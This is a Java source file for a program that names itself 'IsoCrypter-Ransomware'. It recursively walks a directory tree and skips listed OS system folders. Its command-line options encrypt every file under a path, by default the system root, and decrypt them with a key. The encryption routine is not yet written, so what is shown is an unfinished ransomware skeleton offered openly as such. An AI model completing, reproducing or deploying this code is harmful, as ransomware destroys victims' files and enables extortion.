package com.iso53;

import org.apache.commons.cli.*;

import java.io.File;
import java.util.HashSet;

class App {

    private static String PATH;
    private static HashSet<String> CURR_OS_EXCLUDED_FOLDERS;

    public static void main(String[] args) {

        PATH = "C:\\Users\\termi\\Desktop\\Ransomware Trial";
        CURR_OS_EXCLUDED_FOLDERS = OS.getCurrentOS() == OS.WINDOWS ? OS.Windows.getExcludedFolders() : OS.Linux.getExcludedFolders();

        Options options = new Options();
        initOptions(options);
        parseOptions(options, args);

        traverseAndEncrypt(new File(PATH).listFiles());
    }

    public static void traverseAndEncrypt(File[] files) {
        if (files == null) {
            return;
        }

        for (File file : files) {
            if (file.isDirectory()) {
                if (!CURR_OS_EXCLUDED_FOLDERS.contains(file.getName().toLowerCase())) {
                    // System.out.println("Directory: " + file.getAbsolutePath());
                    traverseAndEncrypt(file.listFiles());
                }
            } else {
                // System.out.println("File: " + file.getAbsolutePath());
            }
        }
    }

    private static void initOptions(Options options) {
        options.addOption("h", "help", false, "Prints help message.");
        options.addOption("e", "encrypt", false, "Encrypts all the files in the specified path.");
        options.addOption(Option
                .builder("d")
                .longOpt("decrypt")
                .desc("Decrypts all the files in the specified path.")
                .hasArg()
                .argName("key")
                .build());
        options.addOption(Option
                .builder("p")
                .longOpt("path")
                .desc("Specify the path the program should run. Default is the root path of the OS.")
                .hasArg()
                .argName("path")
                .build());
    }

    private static void parseOptions(Options options, String[] args) {
        // Parse the command line arguments
        CommandLineParser parser = new DefaultParser();
        try {
            CommandLine cmd = parser.parse(options, args);

            if (cmd.hasOption("help")) {
                HelpFormatter helpFormatter = new HelpFormatter();
                helpFormatter.printHelp("IsoCrypter-Ransomware", options);
            }

            if (cmd.hasOption("decrypt")) {
                String key = cmd.getOptionValue("decrypt");
                // traverseAndEncrypt();
            }
        } catch (ParseException e) {
            e.printStackTrace();
        }
    }

}